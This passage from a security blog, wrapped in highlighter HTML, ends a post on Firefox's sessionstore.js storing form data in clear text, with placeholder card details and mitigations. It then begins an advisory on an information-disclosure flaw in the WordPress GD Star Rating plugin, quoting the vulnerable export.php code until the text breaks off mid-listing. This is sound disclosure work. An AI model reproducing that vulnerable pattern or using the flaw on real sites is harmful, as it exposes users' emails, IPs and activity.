class="crayon-s">"height"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">882</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-94"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"screenX"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">517</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-95"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"screenY"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-96"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"sizemode"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"normal"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-97"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"title"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"New Tab"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-98"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"_shouldRestore"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">true</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-99"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-100"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-101"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">"selectedWindow"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-102"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">"_closedWindows"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">[</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-103">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-104"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-105"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">"session"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-106"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"state"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"stopped"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-107"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"lastUpdate"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">1343258515802</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-108"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"startTime"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">1343258444811</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-109"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"recentCrashes"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-110"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-111"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">"scratchpads"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">[</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-112">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-113"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-114"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0199 seconds] -->
<p>Here are some things we can notice that the file contains:</p>
<ul>
<li>A list of open windows
<ul>
<li>A list of tabs
<ul>
<li>Tab entries</li>
</ul>
</li>
<li>Index of selected tab</li>
<li>Closed tabs
<ul>
<li>Tab entries</li>
</ul>
</li>
<li>Width</li>
<li>Height</li>
<li>Screen X</li>
<li>Screen Y</li>
<li>Size mode</li>
<li>Title of window</li>
<li>Flag for if the window should restore</li>
</ul>
</li>
<li>Index of window selected</li>
<li>A list of closed windows
<ul>
<li>A list of tabs
<ul>
<li>Tab entries</li>
</ul>
</li>
<li>Index of selected tab</li>
<li>Closed tabs
<ul>
<li>Tab entries</li>
</ul>
</li>
</ul>
</li>
<li>Session information
<ul>
<li>State of the session</li>
<li>Time stamp for last update</li>
<li>Time stamp for when the session started</li>
<li>A flag for if the session crashed</li>
</ul>
</li>
<li>Scratch pads (A developer tool)</li>
</ul>
<p>We notice that the structure is two lists of windows(Open and closed), which contains two lists of tabs (Open and closed), and then a bit of extra data. Each tab then has a whole substructure to itself that is duplicated. If the page is no longer active (It may have been browsed away from), it will contain this:</p>
<ul>
<li>URL</li>
<li>Title</li>
<li>ID</li>
<li>Document shell ID</li>
<li>Document identifier</li>
</ul>
<p>But if it is active, it will contain a bunch more:</p>
<ul>
<li>URL</li>
<li>Title</li>
<li>ID</li>
<li>Document Shell ID</li>
<li>Referrer</li>
<li>Document identifier</li>
<li>A list of children
<ul>
<li>URL</li>
<li>ID</li>
<li>Document Shell ID</li>
<li>Owner(base64)</li>
<li>Documentation identifier</li>
<li>Scroll state</li>
</ul>
</li>
<li>Form data</li>
<li>Scroll state</li>
</ul>
<p>All this will of course be a lot more complex to look at when more complex tab setups and browser history is present. This is by far the most simple I could make it by only just browsing enough to show the major aspects of it.</p>
<p><strong>Private information in the file</strong><br />
What you may have noticed by now, if you look at the big bit of JSON above, is that form data is included in the file. This is something to be aware of, if you type sensitive information in.</p>
<p>Specifically, this is the bit where you have to be careful:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa6e10845204503" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
"formdata": {
  "#amount": "9001",
  "#country_code": 1,
  "#first_name": "John",
  "#last_name": "Doe",
  "#credit_card_type": 2,
  "#cc_number": "1111-2222-3333-4444-5555",
  "#expdate_month": "01",
  "#expdate_year": "12",
  "#cvv2_number": "123",
  "#address1": "Doestreet 1",
  "#city": "Johntown",
  "#state": 11,
  "#zip": "9001",
  "#H_PhoneNumber": "22523 30999",
  "#email-address": "john.doe@doe.john"
},</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa6e10845204503-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6e10845204503-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa6e10845204503-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6e10845204503-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa6e10845204503-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6e10845204503-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa6e10845204503-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6e10845204503-8">8</div><div class="crayon-num" data-line="crayon-53c98e7aa6e10845204503-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6e10845204503-10">10</div><div class="crayon-num" data-line="crayon-53c98e7aa6e10845204503-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6e10845204503-12">12</div><div class="crayon-num" data-line="crayon-53c98e7aa6e10845204503-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6e10845204503-14">14</div><div class="crayon-num" data-line="crayon-53c98e7aa6e10845204503-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6e10845204503-16">16</div><div class="crayon-num" data-line="crayon-53c98e7aa6e10845204503-17">17</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa6e10845204503-1"><span class="crayon-s">"formdata"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6e10845204503-2"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">"#amount"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"9001"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6e10845204503-3"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">"#country_code"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6e10845204503-4"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">"#first_name"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"John"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6e10845204503-5"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">"#last_name"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"Doe"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6e10845204503-6"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">"#credit_card_type"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6e10845204503-7"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">"#cc_number"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"1111-2222-3333-4444-5555"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6e10845204503-8"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">"#expdate_month"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"01"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6e10845204503-9"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">"#expdate_year"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"12"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6e10845204503-10"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">"#cvv2_number"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"123"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6e10845204503-11"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">"#address1"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"Doestreet 1"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6e10845204503-12"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">"#city"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"Johntown"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6e10845204503-13"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">"#state"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">11</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6e10845204503-14"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">"#zip"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"9001"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6e10845204503-15"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">"#H_PhoneNumber"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"22523 30999"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6e10845204503-16"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">"#email-address"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"john.doe@doe.john"</span></div><div class="crayon-line" id="crayon-53c98e7aa6e10845204503-17"><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0036 seconds] -->
<p>As you can tell, the full form I was presented with at Paypal has been stored in clear-text on my drive despite closing the tab and the window. An unaware user could think at this point that because they can&#8217;t see the window, that the inputted data is gone for good. That is however not the case.</p>
<p>I&#8217;ve tested this with password fields. These are not stored, for good reasons. But it is clear that non-password fields may and will often contain information which you may not want to</p>
<p><strong>Mitigation options</strong><br />
If you&#8217;re concerned with data that may be present inadvertently in this file, you have a few options for dealing with this</p>
<p><strong>Using private browsing mode</strong><br />
The private browsing mode is probably overkill for many. The danger with this feature is that it is not made explicitly clear to the user what is being stored. But if you have sensitive information you want to hide from the local machine, you should be using this anyway.</p>
<p><strong><a href="http://kb.mozillazine.org/Browser.sessionstore.resume_from_crash">browser.sessionstore.resume_from_crash</a></strong><br />
This flag can be changed from the default value of true to ensure that if the browser crashes or otherwise unexpectedly closes, that it does not commit the sessionstore with this information. But this doesn&#8217;t disable the feature entirely.</p>
<p><strong><a href="http://kb.mozillazine.org/Browser.sessionstore.max_tabs_undo">browser.sessionstore.max_tabs_undo</a> and <a href="http://kb.mozillazine.org/Browser.sessionstore.max_windows_undo">browser.sessionstore.max_windows_undo</a></strong><br />
These two flags allow you to specifically set how many tabs and windows respectively are stored in cache. By setting these to 0, you can entirely disable this feature, causing no potentially sensitive information to be stored.</p>
<p><strong>The manual approach</strong><br />
Another thing you can do, while not as foolproof, is to remove any information in form fields before closing a tab, which you do not want to be cached. While this works, it should be remembered that the possibility is still there if not careful! You can also clear private data from Firefox through the built-in options, which will clear this out. Again the problem becomes the fact it requires manual interaction, which depends on the user being aware of this information being cached.</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/privacy/" title="View all posts in Privacy" rel="category tag">Privacy</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/firefox/" rel="tag">Firefox</a>, <a href="https://charlieeriksen.github.io/tag/privacy/" rel="tag">Privacy</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2012/07/26/firefox-sessionstore-js-and-privacy/#respond" title="Comment on Firefox sessionstore.js and privacy">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-72 -->

				
					
<article id="post-39" class="post-39 post type-post status-publish format-standard hentry category-advisories tag-gd-star-rating tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/07/25/wordpress-gd-star-rating-information-disclosure-vulnerability/" title="9:58 pm" rel="bookmark" class="entry-date"><time datetime="2012-07-25T21:58:17+00:00" pubdate>July 25, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2012/07/25/wordpress-gd-star-rating-information-disclosure-vulnerability/" title="Permalink to WordPress GD Star Rating information disclosure vulnerability" rel="bookmark">WordPress GD Star Rating information disclosure vulnerability</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong><br />
<a href="http://secunia.com/advisories/49850/">Secunia Advisory SA 49850</a></p>
<p><strong>Analysis</strong><br />
The GD Star Rating plugin &#8220;allows you to set up advanced rating and review system for post types and comments in your blog using single, multi and thumbs ratings&#8221;. Through its admin interface, you can export some data, such as T2 templates and votes. The interesting thing it will allow you to do, is export user data. This will include userID, username, user email address, what vote was casted on which post, when the vote was cast, IP and user agent. However, a flaw exists in the code in <a href="http://plugins.svn.wordpress.org/gd-star-rating/trunk/export.php">export.php</a> which allows for information disclosure of these values.</p>
<p>The file will import some configuration and export classes, and then start figuring out what to export. It then takes the &#8220;ex&#8221; value to determine the export type, &#8220;de&#8221; for the data to export(Article or comment data), and then &#8220;us&#8221; for how much data to export.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa7785415683159" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
require_once("./code/cls/export.php");
require_once("./config.php");
$wpload = get_gdsr_wpload_path();
require($wpload);

global $wpdb;

if (isset($_GET["ex"])) {
    $export_type = $_GET["ex"];
    $get_data = $_GET;

    switch($export_type) {
        case "user":
            $export_name = $export_type.'_'.$_GET["de"];
            break;
        case "t2":
            $export_name = 't2';
            break;
        case "t2full":
            $export_name = 't2_full';
            break;
    }

    switch($export_type) {
        case "user":
            $values = array("us" =&gt; array("min", "nor"), "de" =&gt; array("article", "comment"));

            foreach ($get_data as $key =&gt; $value) {
                if (isset($values[$key])) {
                    if (!in_array($value, $values[$key])) {
                        die("invalid_request");
                    }
                } else if ($key != "ex") {
                    if ($value !== "on") {
                        die("invalid_request");
                    }
                }
            }

            header('Content-type: text/csv');
            header('Content-Disposition: attachment; filename="gdsr_export_'.$export_name.'.csv"');
            $sql = GDSRExport::export_users($_GET["us"], $_GET["de"], $get_data);
            $rows = $wpdb-&gt;get_results($sql, ARRAY_N);
            if (count($rows) &gt; 0) {
                foreach ($rows as $row) {
                    echo '"'.join('", "', $row).'"';
                    echo "\r\n";
                }
            }
            break;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa7785415683159-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7785415683159-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa7785415683159-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7785415683159-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa7785415683159-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7785415683159-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa7785415683159-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7785415683159-8">8</div><div class="crayon-num" data-line="crayon-53c98e7aa7785415683159-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7785415683159-10">10</div><div class="crayon-num" data-line="crayon-53c98e7aa7785415683159-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7785415683159-12">12</div><div class="crayon-num" data-line="crayon-53c98e7aa7785415683159-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7785415683159-14">14</div><div class="crayon-num" data-line="crayon-53c98e7aa7785415683159-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7785415683159-16">16</div><div class="crayon-num" data-line="crayon-53c98e7aa7785415683159-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7785415683159-18">18</div><div class="crayon-num" data-line="crayon-53c98e7aa7785415683159-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7785415683159-20">20</div><div class="crayon-num" data-line="crayon-53c98e7aa7785415683159-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7785415683159-22">22</div><div class="crayon-num" data-line="crayon-53c98e7aa7785415683159-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7785415683159-24">24</div><div class="crayon-num" data-line="crayon-53c98e7aa7785415683159-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7785415683159-26">26</div><div class="crayon-num" data-line="crayon-53c98e7aa7785415683159-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7785415683159-28">28</div><div class="crayon-num" data-line="crayon-53c98e7aa7785415683159-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7785415683159-30">30</div><div class="crayon-num" data-line="crayon-53c98e7aa7785415683159-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7785415683159-32">32</div><div class="crayon-num" data-line="crayon-53c98e7aa7785415683159-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7785415683159-34">34</div><div class="crayon-num" data-line="crayon-53c98e7aa7785415683159-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7785415683159-36">36</div><div class="crayon-num" data-line="crayon-53c98e7aa7785415683159-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7785415683159-38">38</div><div class="crayon-num" data-line="crayon-53c98e7aa7785415683159-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7785415683159-40">40</div><div class="crayon-num" data-line="crayon-53c98e7aa7785415683159-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7785415683159-42">42</div><div class="crayon-num" data-line="crayon-53c98e7aa7785415683159-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7785415683159-44">44</div><div class="crayon-num" data-line="crayon-53c98e7aa7785415683159-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7785415683159-46">46</div><div class="crayon-num" data-line="crayon-53c98e7aa7785415683159-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7785415683159-48">48</div><div class="crayon-num" data-line="crayon-53c98e7aa7785415683159-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7785415683159-50">50</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa7785415683159-1"><span class="crayon-e">require_once</span><span class="crayon-sy">(</span><span class="crayon-s">"./code/cls/export.php"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7785415683159-2"><span class="crayon-e">require_once</span><span class="crayon-sy">(</span><span class="crayon-s">"./config.php"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7785415683159-3"><span class="crayon-sy">$</span><span class="crayon-v">wpload</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">get_gdsr_wpload_path</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7785415683159-4"><span class="crayon-e">require</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">wpload</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7785415683159-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7785415683159-6"><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7785415683159-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7785415683159-8"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">"ex"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa7785415683159-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">export_type</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">"ex"</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7785415683159-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">get_data</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">_GET</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7785415683159-11">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7785415683159-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">switch</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">export_type</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa7785415683159-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-s">"user"</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7785415683159-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">export_name</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">export_type</span><span class="crayon-sy">.</span><span class="crayon-s">'_'</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span 